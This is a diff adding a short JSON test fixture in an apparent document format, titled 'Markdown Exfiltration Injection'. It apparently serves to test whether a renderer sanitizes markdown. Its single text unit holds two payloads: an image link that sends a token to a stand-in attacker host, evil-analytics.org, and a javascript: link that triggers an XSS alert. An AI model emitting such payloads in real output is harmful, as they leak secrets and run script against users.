@@ -1,0 +1,47 @@
+{
+  "format": "paralleldoc",
+  "version": "3.0",
+  "metadata": {
+    "document_id": "doc-sec-04-markdown",
+    "revision": "rev-1",
+    "title": "Markdown Exfiltration Injection",
+    "author_refs": [
+      "auth-sec-01"
+    ]
+  },
+  "authors": [
+    {
+      "id": "auth-sec-01",
+      "kind": "tool",
+      "name": "Security Tester"
+    }
+  ],
+  "units": [
+    {
+      "id": "u-sec-04",
+      "kind": "analysis",
+      "title": "Markdown Exfiltration Vectors",
+      "text": "Testing external image leak: ![exfil](https://evil-analytics.org/leak?token=SECRET_123) and javascript link: [Click for info](javascript:window.PWNED=1;alert('MD_LINK_XSS'))",
+      "text_format": "markdown-safe",
+      "author_refs": [
+        "auth-sec-01"
+      ],
+      "epistemic": "hypothesis",
+      "status": "draft",
+      "source_refs": [],
+      "asset_ids": []
+    }
+  ],
+  "groups": [
+    {
+      "id": "g-sec-04",
+      "title": "Markdown Security Group",
+      "unit_refs": [
+        "u-sec-04"
+      ]
+    }
+  ],
+  "visuals": [],
+  "assets": [],
+  "profiles": []
+}
